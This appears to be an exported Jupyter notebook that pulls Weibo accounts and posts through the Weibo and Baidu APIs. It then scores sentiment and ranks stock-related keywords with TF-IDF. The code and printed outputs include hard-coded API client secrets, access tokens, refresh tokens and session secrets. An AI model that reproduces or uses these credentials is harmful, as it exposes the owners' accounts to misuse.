# %% [markdown]
# #Old

# %%
regex = re.compile('(?:谈股|说股|讲股|论股|看股|港股|美股|理财师|A股|经济政策|短线|炒股|荐股|盈亏|炒股|股利|股海|股民|股票|个股|做空|诱多|诱空|踏空|长空|短空|长多|短多|死多|翻多|翻空|多杀多|扎空|空仓|建仓|满仓|斩仓|减仓|加仓|重仓|清仓|套牢|补仓|仓位|庄家|震仓|追涨|杀跌|止盈|抄底|逃顶|盘整|回档|坐庄|吸筹|对敲|洗盘|散户|中户|坐轿|抬轿|筹码|抢帽子|多头陷阱|空头陷阱|护盘|跳空|开盘价|收盘价|最高价|最低价|成交量|放量|缩量|热门股|冷门股|白马股|黑马股|龙头股|阴跌|换手率|现手|平开|低开|高开|内盘|外盘|均价|浮筹|市盈率|含权|回购|基本面分析|量比|每股|收益|市净率|探底|填权|停牌|退市)')    
string = "《中国证券报》是新华通讯社主办的全国性看股专业日报，是中国证券监督管理委员会指定披露上市公司信息报纸，中国保险监督管理委员会指定披露保险信息报纸，中国银行业监督管理委员会指定披露信托公司信息报纸。"
import re
re.search(regex, string)
# Out:
# <_sre.SRE_Match object; span=(19, 21), match='看股'>

# %%
import requests
from bs4 import BeautifulSoup

sub_url = 'https://api.weibo.com/oauth2/authorize?client_id={}&redirect_uri={}'
client_id = '59433145'
client_secret = '0c1890e9ae66400a737dbfc049e5f225'
redirect_uri = 'http://open.weibo.com/apps/59433145'

req_url = sub_url.format(client_id, redirect_uri)

print (req_url)
# Out:
# https://api.weibo.com/oauth2/authorize?client_id=59433145&redirect_uri=http://open.weibo.com/apps/59433145

# %%
code = '20260f1810b6461acc5427477b60ffa9'
acc_url = 'https://api.weibo.com/oauth2/access_token'
dic = {'client_id':client_id, 'client_secret': client_secret, 'grant_type': 'authorization_code', 'redirect_uri': redirect_uri, 'code': code}
response = requests.post(acc_url, dic)
print (response.text)
# Out:
# {"access_token":"2.00gphrcG0HR4BE35ccee97830VGveF","remind_in":"157679999","expires_in":157679999,"uid":"6071097640","isRealName":"true"}

# %%
base_url = 'https://api.weibo.com/2/users/show.json?access_token={}&screen_name={}'
access_token= '2.00gphrcG0HR4BE35ccee97830VGveF'
# names = ['天津股侠', 'wu2198', '雨农谈股', '唐史主任司马迁', '李大霄', '花容', '叶荣添', '洪榕']
names = ['老谭电商', '大佬坊间八卦', '涂画图画', '娱乐追击令', '朱伟老师', '熊市猎人', '天天美食推荐 ', '娱乐天天看'
        ,'兽爷爷爷', '锦鲤大王', '军事爆料圈', '思想聚焦', '虎扑的步行街']
uids = []

import json
for screen_name in names:
    url = base_url.format(access_token, screen_name)
#     print (url)
    response = requests.get(url)
    result = json.loads(response.text)
    #print (result)
    print (result.get('id'), result.get('name'), result.get('ability_tags'))
    uids.append(str(result.get('id')))

print (uids)
# Out:
# 5034901460 老谭电商 None
# 2472108573 大佬坊间八卦 None
# 2736435030 涂画图画 None
# 2329588261 娱乐追击令 None
# 1295674790 朱伟老师 留学,SAT,英语口语,美国留学,加拿大留学,英国留学,雅思,高考,四六级
# 1690076015 熊市猎人 股票,A股,投资
# None None None
# 2878056165 娱乐天天看 None
# 1052404565 兽爷爷爷 None
# 3641513235 锦鲤大王 风水,周易,星座,测字算名,运势,相学
# 5864181936 军事爆料圈 None
# 1742566624 思想聚焦 内容资讯,媒体评论
# 2054300185 虎扑的步行街 None
# ['5034901460', '2472108573', '2736435030', '2329588261', '1295674790', '1690076015', 'None', '2878056165', '1052404565', '3641513235', '5864181936', '1742566624', '2054300185']

# %%
word_list = ['财经','投资','短线','炒股','荐股','盈亏','炒股','入股','认股','股份','进股','股利','股海','股民','股票','股东','股息','股权','股分','个股','做空','诱多','诱空','踏空','长空','短空','长多','短多','死多','翻多','翻空','多杀多','扎空','空仓','建仓','满仓','斩仓','减仓','加仓','重仓','清仓','套牢','补仓','仓位','庄家','震仓','追涨','杀跌','止盈','抄底','逃顶','盘整','反弹','回档','坐庄','吸筹','对敲','打压','洗盘','出货','大户','散户','中户','机构','坐轿','主力','抬轿','筹码','抢帽子','跳水','多头陷阱','空头陷阱','护盘','跳空','开盘价','收盘价','最高价','最低价','成交量','放量','缩量','天量','天价','热门股','冷门股','白马股','黑马股','龙头股','阴跌','换手率','现手','平开','低开','高开','内盘','外盘','均价','浮筹','市盈率','含权','回购','技术分析','基本面分析','量比','每股净资产','每股','收益','趋势','市净率','探底','填权','停牌','退市']
print (len(word_list))
# Out:
# 113

# %%
import re
h = re.compile('(?:谈股|说股|讲股|论股|看股|港股|美股|财经|期货|基金|外汇|理财师|A股|经济政策|短线|炒股|荐股|盈亏|炒股|入股|认股|股份|进股|股利|股海|股民|股票|股东|股息|股权|股分|个股|做空|诱多|诱空|踏空|长空|短空|长多|短多|死多|翻多|翻空|多杀多|扎空|空仓|建仓|满仓|斩仓|减仓|加仓|重仓|清仓|套牢|补仓|仓位|庄家|震仓|追涨|杀跌|止盈|抄底|逃顶|盘整|反弹|回档|坐庄|吸筹|对敲|打压|洗盘|出货|大户|散户|中户|机构|坐轿|主力|抬轿|筹码|抢帽子|跳水|多头陷阱|空头陷阱|护盘|跳空|开盘价|收盘价|最高价|最低价|成交量|放量|缩量|天量|天价|热门股|冷门股|白马股|黑马股|龙头股|阴跌|换手率|现手|平开|低开|高开|内盘|外盘|均价|浮筹|市盈率|含权|回购|技术分析|基本面分析|量比|每股净资产|每股|收益|趋势|市净率|探底|填权|停牌|退市)')

# %%
import pymongo
client = pymongo.MongoClient(host='localhost', port=27017)
db = client['weibo']
collection = db['users']

# %%
fans_result = collection.find({}, {'fans_count':1}) 
fans_list = []
for fans in fans_result:
    fans_list.append(fans['fans_count'])
sorted(fans_list, reverse=True)
# Out:
# [30490272,
#  22293279,
#  16290115,
#  11716985,
#  9860999,
#  9050535,
#  5718995,
#  5022088,
#  3822193,
#  3740195,
#  3634551,
#  3091428,
#  3083658,
#  2978408,
#  2914102,
#  2907339,
#  2871794,
#  2349565,
#  2226607,
#  2013080,
#  2003871,
#  1751044,
#  1714048,
#  1694631,
#  1630266,
#  1543630,
#  1534783,
#  1522373,
#  1478272,
#  1459758,
#  1454744,
#  1450788,
#  1264228,
#  1182820,
#  1140522,
#  1115329,
#  1100209,
#  1099246,
#  1091674,
#  1086906,
#  1048313,
#  922295,
#  876807,
#  857229,
#  807502,
#  766541,
#  716047,
#  712552,
#  709661,
#  674732,
#  672528,
#  650762,
#  638795,
#  612584,
#  597316,
#  591302,
#  582558,
#  581152,
#  564984,
#  557217,
#  519194,
#  507710,
#  502484,
#  499061,
#  498185,
#  491952,
#  487038,
#  486486,
#  470980,
#  448752,
#  420223,
#  404187,
#  400056,
#  391815,
#  384997,
#  378452,
#  377084,
#  370080,
#  368032,
#  366892,
#  356548,
#  356237,
#  352235,
#  348240,
#  333061,
#  328506,
# ...

# %%
ongoing_collection = db['ongoings']
ongoing_collection.find({}, {'oid':1})  
start_user = []
for result in results:
    if result['oid'] != None:
        start_users.append(str(result['oid']))
print('length of start_users: {}'.format(len(start_users)))
# Out:
# length of start_users: 2095

# %%
collection = db['users']
results = collection.find({'name': None})  
for result in results:
    print (result)

# %%
start_users = []
collection = db['users']
results = collection.find({}, {'id':1})  
for result in results:
    res = result['id']
    if res != None:
        start_users.append(str(res))

print (len(start_users), '\n')
# print (start_users)
# Out:
# 2095

# %%
collection = db['ongoings']
cnt = {}
cnt.setdefault(0)
results = collection.find({}, {'oid':1})  
  
for result in results:
    res = result['oid']
    cnt[res] = 1 + cnt.get(res, 0)
        
for key, value in cnt.items():
    if value != 1:
        print (key, value)
# Out:
# 0 None

# %%
collection = db['weibos']
collection.aggregate()

# %% [markdown]
# # Analyze Test

# %%
import requests
import ssl

# client_id 为官网获取的AK， client_secret 为官网获取的SK
host = 'https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&client_id=Yfumcl8ArmpYjBTompSfQnhG&client_secret=ZgG0YcFPAViAIC5v9NrB4kshUicGwvoU'
response = requests.get(host, headers = {'Content-Type': 'application/json'})
print (response.text)
# Out:
# {"access_token":"24.6494167631e3c5ba84457c2c19526dd6.2592000.1541644100.282335-11569351","session_key":"9mzdDcL3hWCfQOxFjyeCfU25tSIubLw6myh9GP\/5jp2rk0bf\/KqdlBZPME6owrDj5uv7iLRMfFacjfj\/sw+nTYuwbYhdow==","scope":"public nlp_simnet nlp_wordemb nlp_comtag nlp_dnnlm_cn brain_nlp_lexer brain_all_scope brain_nlp_comment_tag brain_nlp_dnnlm_cn brain_nlp_word_emb_vec brain_nlp_word_emb_sim brain_nlp_sentiment_classify brain_nlp_simnet brain_nlp_depparser brain_nlp_wordembedding brain_nlp_dnnlm_cn_legacy brain_nlp_simnet_legacy brain_nlp_comment_tag_legacy brain_nlp_lexer_custom brain_nlp_keyword brain_nlp_topic brain_nlp_comment_tag_custom wise_adapt lebo_resource_base lightservice_public hetu_basic lightcms_map_poi kaidian_kaidian ApsMisTest_Test\u6743\u9650 vis-classify_flower lpq_\u5f00\u653e cop_helloScope ApsMis_fangdi_permission smartapp_snsapi_base iop_autocar oauth_tp_app smartapp_smart_game_openapi oauth_sessionkey","refresh_token":"25.33a82643554a019d207ef36613fdd0ee.315360000.18
# ...

# %% [markdown]
# {"access_token":"24.6494167631e3c5ba84457c2c19526dd6.2592000.1541644100.282335-11569351","session_key":"9mzdDcL3hWCfQOxFjyeCfU25tSIubLw6myh9GP\/5jp2rk0bf\/KqdlBZPME6owrDj5uv7iLRMfFacjfj\/sw+nTYuwbYhdow==","scope":"public nlp_simnet nlp_wordemb nlp_comtag nlp_dnnlm_cn brain_nlp_lexer brain_all_scope brain_nlp_comment_tag brain_nlp_dnnlm_cn brain_nlp_word_emb_vec brain_nlp_word_emb_sim brain_nlp_sentiment_classify brain_nlp_simnet brain_nlp_depparser brain_nlp_wordembedding brain_nlp_dnnlm_cn_legacy brain_nlp_simnet_legacy brain_nlp_comment_tag_legacy brain_nlp_lexer_custom brain_nlp_keyword brain_nlp_topic brain_nlp_comment_tag_custom wise_adapt lebo_resource_base lightservice_public hetu_basic lightcms_map_poi kaidian_kaidian ApsMisTest_Test\u6743\u9650 vis-classify_flower lpq_\u5f00\u653e cop_helloScope ApsMis_fangdi_permission smartapp_snsapi_base iop_autocar oauth_tp_app smartapp_smart_game_openapi oauth_sessionkey","refresh_token":"25.33a82643554a019d207ef36613fdd0ee.315360000.1854412100.282335-11569351","session_secret":"d771301d12641a3dcb9ef9424aa85ee6","expires_in":2592000}

# %%
import requests
import ssl

# client_id 为官网获取的AK， client_secret 为官网获取的SK
host = 'https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&client_id=4aCcPzkcjmasGgebYT1zevee&client_secret=1LDn3RGIRBrqek3GTVfhuolYD4G022Gg'
response = requests.get(host, headers = {'Content-Type': 'application/json'})
print (response.text)
# Out:
# {"access_token":"24.1893e2099711079aa230e065cfa1b422.2592000.1535466306.282335-11604196","session_key":"9mzdCrz9ZU6Gb\/s\/Llbiw5BnKS2kkwCwEHxROLkim2txiNGSTr7ly1mEVF0q1Jq\/ybwCImo8ZWi6tzBg24rKIHXhVLTkOQ==","scope":"public nlp_simnet nlp_wordemb nlp_comtag nlp_dnnlm_cn brain_nlp_lexer brain_all_scope brain_nlp_comment_tag brain_nlp_dnnlm_cn brain_nlp_word_emb_vec brain_nlp_word_emb_sim brain_nlp_sentiment_classify brain_nlp_simnet brain_nlp_depparser brain_nlp_wordembedding brain_nlp_dnnlm_cn_legacy brain_nlp_simnet_legacy brain_nlp_comment_tag_legacy brain_nlp_lexer_custom brain_nlp_keyword brain_nlp_topic brain_nlp_comment_tag_custom wise_adapt lebo_resource_base lightservice_public hetu_basic lightcms_map_poi kaidian_kaidian ApsMisTest_Test\u6743\u9650 vis-classify_flower lpq_\u5f00\u653e cop_helloScope ApsMis_fangdi_permission smartapp_snsapi_base iop_autocar","refresh_token":"25.966160cc20829758d3c2a4b53f6f3cdc.315360000.1848234306.282335-11604196","session_secret":"94d801da678114
# ...

# %% [markdown]
# #### "access_token":"24.1893e2099711079aa230e065cfa1b422.2592000.1535466306.282335-11604196","expires_in":2592000}

# %%
import requests, re, time
start = time.clock()
headers = {
    'Content-Type': 'application/json'
}
params = {
    'access_token': '24.cb5b8cccad6a49c21d4cccd1a047f9ae.2592000.1534940191.282335-11569351'
}
data = {
    "text": "我发表了头条文章日操作策略问题疫苗持续发酵，当心医药股被血洗日操作策略问题疫苗持续发酵，当心医药股被血洗" 
}
response = requests.post('https://aip.baidubce.com/rpc/2.0/nlp/v1/sentiment_classify',
                        params=params, headers=headers, json=data)
print (response.text)
elapsed = (time.clock() - start)
time.sleep(0.25)
# Out:
# {"log_id": 6563809707894561764, "text": "我发表了头条文章日操作策略问题疫苗持续发酵，当心医药股被血洗日操作策略问题疫苗持续发酵，当心医药股被血洗", "items": [{"positive_prob": 0.207467, "confidence": 0.538961, "negative_prob": 0.792533, "sentiment": 0}]}

# %% [markdown]
# # Get IDF

# %% [markdown]
# # not in used

# %%
# import pymongo
# import pandas as pd
# client = pymongo.MongoClient(host='120.79.139.239', port=27017)
# db_idf = client['weibo_idf']
# collection_idf = db_idf['weibo_idf']
# results = collection_idf.find({}, {'text':1})

# print (results.count())
# data = pd.DataFrame(columns=['id','text'])

# data_id = []
# data_text = []
# for cnt, result in enumerate(results):
#     data_id.append(cnt)
#     data_text.append(result['text'])
#     if cnt % 1000 == 0:
#         print ('cnt = {}'.format(cnt))

# data['id'] = pd.Series(data_id)
# data['text'] = pd.Series(data_text)

# import re, jieba
# jieba.load_userdict('jieba_dict_companys')
# def get_clean_text(data):
#     texts = []
#     regex_at = re.compile('@([^ |<|\?|:|\$|\^\.|\*|\|\(|\)|\\|\/|<|>|\[|\]]+)')
#     regex_chi = re.compile('[^\u4e00-\u9fa5|，|!|。]+|\?{1}|:{1}')
#     for cnt, raw in enumerate(data.text):
#         del_name = re.findall(regex_at, raw)
#         for name in del_name:
#             raw = re.sub(name, '，', raw)
#         raw = re.sub(regex_chi, '，', raw)
#         raw = re.sub(' +', ' ', raw)
#         texts.append(raw)
        
#         if cnt % 100 == 0:
#             print ('cnt = {}'.format(cnt))
            
#     if len(texts) != len(data):
#         print('not the same length')
        
#     return pd.Series(texts)

# data['text'] = get_clean_text(data)

# data_dicts = []
# for cnt, lst in enumerate(data.words):
#     dic = get_word_count(lst)
#     data_dicts.append(dic)
#     if cnt % 1000 == 0:
#         print ('cnt = {}'.format(cnt))

#data['dict'] = data_dicts

# idf_vocab = []
# for k, v in count.items():
#     idf_vocab.append((k,v))
# sorted_idf_vocab = list(sorted(idf_vocab, key = lambda v : v[1], reverse = 1))

## data.to_csv('../ScrapyDatas/weibo_idf_data.csv')

# def get_word_count(lst):
#     count = {}
#     for x in lst:
#         if x in count:
#             count[x] += 1
#         else:
#             count[x] = 1
#     return count

# %% [markdown]
# # in used

# %%
a = set([])

# %%
list(set(['a','b','c','a','c','d']))
# Out:
# ['c', 'd', 'a', 'b']

# %%
import re
def read_stop_words(): 
    stop_words = []
    stop_letters = []
    with open('stop_words.txt') as sp:
        for x in sp:
            stop_words.append(x[:-1])
    with open('stop_letters.txt') as sp:
        for x in sp:
            stop_letters.append(x[:-1])
    stop_words = set(stop_words)
    re_stop_letter = re.compile('|'.join(stop_letters))
    return (stop_words, re_stop_letter)
stop_words, re_stop_letter = read_stop_words()

# %%
import re, jieba
import jieba.posseg as postag

def get_words(data, re_stop_letter, stop_words, output=True):
    words = []
    jieba.enable_parallel(8)
    for cnt, raw in enumerate(data.text):
        result = postag.cut(raw)
        raw = [x.word for x in result if (len(x.word) > 1 and 'n' in x.flag)]
        #raw = [x.word for x in result if (len(x.word) > 1 and 'n' in x.flag and re.search(re_stop_letter, x.word) == None and x.word not in stop_words)]
        words.append(raw)
        
        if cnt % 1000 == 0 and output == True:
            print ('cnt = {}'.format(cnt))
            
    return pd.Series(words)

# %%
test_data = pd.read_csv('../ScrapyDatas/weibo_test_data.csv')
test_words = test_data['words']

# %%
def get_word_count_test(lst):
    count = {}
    for x in eval(lst):
        if x not in stop_words and re.search(re_stop_letter, x) == None:
            if x in count:
                count[x] += 1
            else:
                count[x] = 1
    return count

# %%
test_words_dict = [get_word_count_test(lst) for lst in test_words]

# %%
import math
def tf(word, count):
    return count[word] / sum(count.values())

def n_containing(word, count_list):
    return sum(1 for count in count_list if word in count)
    
def idf(word, count_list):
    return math.log(len(count_list) / (1 + n_containing(word, count_list)))

def tfidf(word, count, count_list):
    return tf(word, count) * idf(word, count_list)

# %%
countlist = data.dict
for i, count in enumerate(test_words_dict):
    print("Top words in document {}".format(i + 1))
    scores = {word: tfidf(word, count, countlist) for word in count}
    sorted_words = sorted(scores.items(), key=lambda x: math.sqrt(len(x[0]))*x[1], reverse=True)
    for word, score in sorted_words[:5]:
        print("\tWord: {}, TF-IDF: {}".format(word, round(score, 5))) 
    if i > 10: 
        break
# Out:
# Top words in document 1
# 	Word: 蓝筹权, TF-IDF: 3.01035
# 	Word: 连阳, TF-IDF: 2.59186
# 	Word: 创业板, TF-IDF: 2.0643
# 	Word: 刚性, TF-IDF: 2.46104
# Top words in document 2
# 	Word: 新娘, TF-IDF: 1.07694
# 	Word: 婚纱, TF-IDF: 1.00978
# 	Word: 心店, TF-IDF: 0.87294
# 	Word: 邀请函, TF-IDF: 0.62534
# 	Word: 晚八点, TF-IDF: 0.61174
# Top words in document 3
# 	Word: 舞林, TF-IDF: 1.32854
# 	Word: 毛晓彤, TF-IDF: 1.06686
# 	Word: 牛仔, TF-IDF: 0.90743
# 	Word: 米奇, TF-IDF: 0.58604
# 	Word: 星途, TF-IDF: 0.58333
# Top words in document 4
# 	Word: 泪崩, TF-IDF: 1.55189
# 	Word: 林俊杰, TF-IDF: 1.24274
# 	Word: 车祸, TF-IDF: 1.24502
# 	Word: 歌迷, TF-IDF: 1.23993
# 	Word: 小时候, TF-IDF: 0.99835
# Top words in document 5
# Top words in document 6
# Top words in document 7
# 	Word: 放鸽子, TF-IDF: 2.50113
# 	Word: 玛瑙, TF-IDF: 2.44318
# 	Word: 结缘, TF-IDF: 2.18639
# 	Word: 物件, TF-IDF: 2.05868
# Top words in document 8
# 	Word: 玉琮, TF-IDF: 2.04477
# 	Word: 礼器, TF-IDF: 0.88707
# 	Word: 良渚, TF-IDF: 0.37438
# 	Word: 墓葬, TF-IDF: 0.3729
# ...

# %%
def tp(word):
    if next(postag.cut(word)) != None:
        return next(postag.cut(word)).flag
    else:
        return None

# %%
data_dict_all = {}
for dic in data.dict:
    for k, v in dic.items():
        if k in data_dict_all:
            data_dict_all[k] += v
        else:
            data_dict_all[k] = v
            
        if len(k) == 4:
            head, tail = k[2:], k[:-2]
            if head in data_dict_all:
                data_dict_all[head] += v
            else:
                data_dict_all[head] = v
                
            if tail in data_dict_all:
                data_dict_all[tail] += v
            else:
                data_dict_all[tail] = v

# %%
test_dict_all = {}
for dic in test_words_dict:
    for k, v in dic.items():
        if k in test_dict_all:
            test_dict_all[k] += v
        else:
            test_dict_all[k] = v
        
        if len(k) == 4:
            head, tail = k[2:], k[:-2]
            if head in test_dict_all:
                test_dict_all[head] += v
            else:
                test_dict_all[head] = v
                
            if tail in test_dict_all:
                test_dict_all[tail] += v
            else:
                test_dict_all[tail] = v

# %%
data_dict_all = dict(sorted(data_dict_all.items(), key=lambda x: math.sqrt(len(x[0]))*x[1], reverse=True))
data_dict_all = dict([(x,y) for x,y in data_dict_all.items() if y > 10])

# %%
test_dict_all = dict(sorted(test_dict_all.items(), key=lambda x: math.sqrt(len(x[0]))*x[1], reverse=True))
test_dict_all = dict([(x,y) for x,y in test_dict_all.items() if y > 5])

# %%
#combinsd idf
print("Top words in test_words")
# idf_vs = sum(data_dict_all.values())

all_scores = { word: tf(word, test_dict_all) *
              tfidf(word, test_dict_all, data_dicts)
              #( math.log(idf_vs)/(1+ (data_dict_all[word] if word in data_dict_all else 0)) )
                     for word in set(list(test_dict_all))}
all_sorted_words = sorted(all_scores.items(), key=lambda x: math.sqrt(len(x[0]))*x[1], reverse=True)
for word, score in all_sorted_words[:100]:
    print("\tWord: {}, TF-IDF: {}".format(word, round(score, 5)))
# Out:
# Top words in test_words
# 	Word: 疫苗, TF-IDF: 0.03633
# 	Word: 长生, TF-IDF: 0.00849
# 	Word: 生产, TF-IDF: 0.0026
# 	Word: 国家药监局, TF-IDF: 0.00058
# 	Word: 医药, TF-IDF: 0.00069
# 	Word: 创业板, TF-IDF: 0.00045
# 	Word: 概念股, TF-IDF: 0.00035
# 	Word: 李克强, TF-IDF: 0.00029
# 	Word: 狂犬病, TF-IDF: 0.00028
# 	Word: 药品, TF-IDF: 0.00023
# 	Word: 软件, TF-IDF: 0.00018
# 	Word: 军工, TF-IDF: 0.00018
# 	Word: 石墨, TF-IDF: 0.00015
# 	Word: 生物, TF-IDF: 0.00014
# 	Word: 原油, TF-IDF: 0.00013
# 	Word: 电解锰, TF-IDF: 0.0001
# 	Word: 龙头, TF-IDF: 0.00012
# 	Word: 康泰, TF-IDF: 0.00012
# 	Word: 科技股, TF-IDF: 8e-05
# 	Word: 黄金, TF-IDF: 0.0001
# 	Word: 小米, TF-IDF: 9e-05
# 	Word: 消息面, TF-IDF: 7e-05
# 	Word: 银行, TF-IDF: 8e-05
# 	Word: 新浪, TF-IDF: 8e-05
# 	Word: 金融股, TF-IDF: 6e-05
# 	Word: 金融, TF-IDF: 7e-05
# 	Word: 食品, TF-IDF: 7e-05
# 	Word: 道德, TF-IDF: 7e-05
# 	Word: 进口, TF-IDF: 7e-05
# 	Word: 茅台, TF-IDF: 6e-05
# 	Word: 通讯, TF-IDF: 6e-05
# 	Word: 航天, TF-IDF: 6e-05
# 	Word: 特朗普, TF-IDF: 5e-05
# 	Word: 中兴通讯, TF-IDF: 4e-05
# ...

# %%
#combinsd tf
print("Top words in test_words")
all_scores = { word: tf(word, test_dict_all) for word in test_dict_all}
all_sorted_words = sorted(all_scores.items(), key=lambda x: math.sqrt(len(x[0]))*x[1], reverse=True)
for word, score in all_sorted_words[:300]:
    print("\tWord: {}, TF: {}".format(word, round(score, 5))) 
    #print("{}".format(word))
# Out:
# Top words in test_words
# 	Word: 疫苗, TF: 0.09223
# 	Word: 长生, TF: 0.041
# 	Word: 生产, TF: 0.02199
# 	Word: 国家药监局, TF: 0.0089
# 	Word: 医药, TF: 0.00965
# 	Word: 创业板, TF: 0.00739
# 	Word: 狂犬病, TF: 0.00652
# 	Word: 李克强, TF: 0.00635
# 	Word: 概念股, TF: 0.00604
# 	Word: 药品, TF: 0.00585
# 	Word: 软件, TF: 0.0052
# 	Word: 生物, TF: 0.0051
# 	Word: 军工, TF: 0.00455
# 	Word: 小米, TF: 0.00404
# 	Word: 新浪, TF: 0.00397
# 	Word: 石墨, TF: 0.00397
# 	Word: 黄金, TF: 0.0039
# 	Word: 龙头, TF: 0.00378
# 	Word: 康泰, TF: 0.00373
# 	Word: 原油, TF: 0.00368
# 	Word: 电解锰, TF: 0.00289
# 	Word: 银行, TF: 0.00351
# 	Word: 科技股, TF: 0.00284
# 	Word: 金融, TF: 0.00337
# 	Word: 消息面, TF: 0.00272
# 	Word: 特朗普, TF: 0.0027
# 	Word: 进口, TF: 0.00327
# 	Word: 食品, TF: 0.00322
# 	Word: 道德, TF: 0.0032
# 	Word: 金融股, TF: 0.00253
# 	Word: 产品, TF: 0.00308
# 	Word: 中兴通讯, TF: 0.00212
# 	Word: 涉嫌犯罪, TF: 0.00209
# 	Word: 狂犬, TF: 0.00289
# 	Word: 贸易战, TF: 0.00233
# 	Word: 茅台, TF: 0.00282
# 	Word: 国务院, TF: 0.00226
# 	Word: 通讯, TF: 0.00277
# ...

# %% [markdown]
# ## 垃圾 没用
# `
# import jieba.analyse
# jieba.analyse.extract_tags(test_data.c_text[0], topK=5, withWeight=False, allowPOS=())
# `

# %%
data.dict.to_csv('../ScrapyDatas/weibo_idf_dict.csv')

# %%
# import thulac
 
# string = '构筑'
# t = thulac.thulac()
# result = t.cut(string)
# print(result)

from snownlp import SnowNLP
string = str('创业板')
s = SnowNLP(string)
print (list(s.tags))
# Out:
# [('创业', 'v'), ('板', 'Ng')]

# %%
# import pymongo
# import pandas as pd
# clcl = pymongo.MongoClient(host='120.79.139.239', port=27017)
# dbdb = clcl['weibo']
# colcol = dbdb['weibos']

# %%
week=[ time.strftime('%Y-%m-%d', time.localtime(time.time() - x * 24 * 60 * 60)) for x in range(7) ]

# %%
params = ({'access_token': '24.cb5b8cccad6a49c21d4cccd1a047f9ae.2592000.1534940191.282335-11569351'},{'access_token': '24.1893e2099711079aa230e065cfa1b422.2592000.1535466306.282335-11604196'})

# %%
data0 = pd.read_csv('../ScrapyDatas/weibo_test_data2.csv')

# %%
x = float('nan')

# %%
import math
math.isnan(float(x))
float(str(x))
# Out:
# nan

# %%
import re, pandas as pd, time

# %%
ch = pd.read_excel('../ScrapyDatas/上市股票一览.xlsx')

# %%
def get_word_count(lst):
    count = {}
    for x in lst:
        x = x[-2:]
        if x in count:
            count[x] += 1
        else:
            count[x] = 1
    return count

# %%
rm = set([x[0] for x in sorted(get_word_count(hk).items(),key=lambda x: x[1], reverse=True)[:20]])

# %%
tmp = []
for raw in us:
    raw = str(raw)
    raw = re.sub('[^\u4e00-\u9fa5]+', '', raw)
    if (len(raw) >= 2):
        tmp.append(raw)
print (tmp)
us = tmp
# Out:
# ['新浪', '搜狐', '网易', '百度', '第九城市', '金融界', '携程网', '前程无忧', '斯达康', '泰克飞石', '中芯国际', '新东方', '华视传媒', '航美传媒', '中国铝业', '中海油', '玉柴国际', '广深铁路', '中移动', '中国人寿', '瑞立集团', '中国电信', '中石化', '上石化', '东方航空', '华能电力', '南方航空', '阿特斯', '比克电池', '中汽系统', '中国天然', '新龙亚洲', '富维薄膜', '南太电子', '正保教育', '永新视博', '鑫苑置业', '橡果国际', '昱辉阳光', '英利', '泛华保险', '奇景光电', '晶澳太阳', '凹凸科技', '慧荣科技', '中石油', '中国联通', '日月光半', '友达光电', '台积电', '联电', '矽品', '和信超媒', '畅游', '华住酒店', '中华电信', '圣元国际', '联游网络', '搜房网', '多元印刷', '蓝汛', '诺亚财富', '易车网', '希尼亚', '康迪车业', '中网在线', '公司', '利华国际', '山东昱合', '太宇机电', '同心国际', '晶科能源', '绿诺科技', '大全新能', '瑞达电源', '中国生物', '汉广厦房', '奥瑞金种', '赛诺国际', '万得汽车', '中国高速', '福麒国际', '海湾资源', '双威教育', '新奥混凝', '中国基', '武汉通用', '艾格菲国', '中国脐带', '研控科技', '中强能源', '和利时自', '联合信息', '中国基础', '中国医药', '高科能源', '盈丰科技', '中环球船', '江波制药', '西蓝公司', '中国清洁', '智远天下', '鑫达集团', '岳鹏成电', '九洲大药', '泰和诚医', '数百亿', '绿润集团', '奥星制药', '华达产业', '中国汽车', '科兴生物', '中国绿色', '圣恺工业', '新东方能', '博润', '东方纸业', '奥盛创新', '世纪互联', '人人公司', '凌动智行', '凤凰新媒', '正兴集团', '中国信息', '唯品会', '欢聚时代', '德卫', '能源', '亚太电线', '南茂科技', 
# ...

# %%
tmp = []
for raw in us:
    if (len(raw) <= 2):
        continue
    if raw[-2:] in rm and len(raw) >= 6:
        tmp.append(raw[:-2])
    tmp.append(raw)
for x in tmp:
    print (x, 'n')
# Out:
# 第九城市 n
# 金融界 n
# 携程网 n
# 前程无忧 n
# 斯达康 n
# 泰克飞石 n
# 中芯国际 n
# 新东方 n
# 华视传媒 n
# 航美传媒 n
# 中国铝业 n
# 中海油 n
# 玉柴国际 n
# 广深铁路 n
# 中移动 n
# 中国人寿 n
# 瑞立集团 n
# 中国电信 n
# 中石化 n
# 上石化 n
# 东方航空 n
# 华能电力 n
# 南方航空 n
# 阿特斯 n
# 比克电池 n
# 中汽系统 n
# 中国天然 n
# 新龙亚洲 n
# 富维薄膜 n
# 南太电子 n
# 正保教育 n
# 永新视博 n
# 鑫苑置业 n
# 橡果国际 n
# 昱辉阳光 n
# 泛华保险 n
# 奇景光电 n
# 晶澳太阳 n
# 凹凸科技 n
# 慧荣科技 n
# 中石油 n
# 中国联通 n
# 日月光半 n
# 友达光电 n
# 台积电 n
# 和信超媒 n
# 华住酒店 n
# 中华电信 n
# 圣元国际 n
# 联游网络 n
# 搜房网 n
# 多元印刷 n
# 诺亚财富 n
# 易车网 n
# 希尼亚 n
# 康迪车业 n
# 中网在线 n
# 利华国际 n
# 山东昱合 n
# 太宇机电 n
# 同心国际 n
# 晶科能源 n
# 绿诺科技 n
# 大全新能 n
# 瑞达电源 n
# 中国生物 n
# 汉广厦房 n
# 奥瑞金种 n
# 赛诺国际 n
# 万得汽车 n
# 中国高速 n
# 福麒国际 n
# 海湾资源 n
# 双威教育 n
# 新奥混凝 n
# 中国基 n
# 武汉通用 n
# 艾格菲国 n
# 中国脐带 n
# 研控科技 n
# 中强能源 n
# 和利时自 n
# 联合信息 n
# 中国基础 n
# 中国医药 n
# 高科能源 n
# 盈丰科技 n
# 中环球船 n
# 江波制药 n
# 西蓝公司 n
# 中国清洁 n
# 智远天下 n
# 鑫达集团 n
# 岳鹏成电 n
# 九洲大药 n
# 泰和诚医 n
# 数百亿 n
# 绿润集团 n
# 奥星制药 n
# 华达产业 n
# 中国汽车 n
# 科兴生物 n
# 中国绿色 n
# 圣恺工业 n
# 新东方能 n
# 东方纸业 n
# 奥盛创新 n
# 世纪互联 n
# 人人公司 n
# 凌动智行 n
# 凤凰新媒 n
# 正兴集团 n
# ...

# %%
# %%
us
# Out:
# ['新浪',
#  '搜狐',
#  '网易',
#  '百度',
#  '第九城市',
#  '金融界',
#  '携程网',
#  '前程无忧',
#  'UT斯达康',
#  '泰克飞石',
#  '中芯国际',
#  '新东方',
#  '华视传媒',
#  '航美传媒',
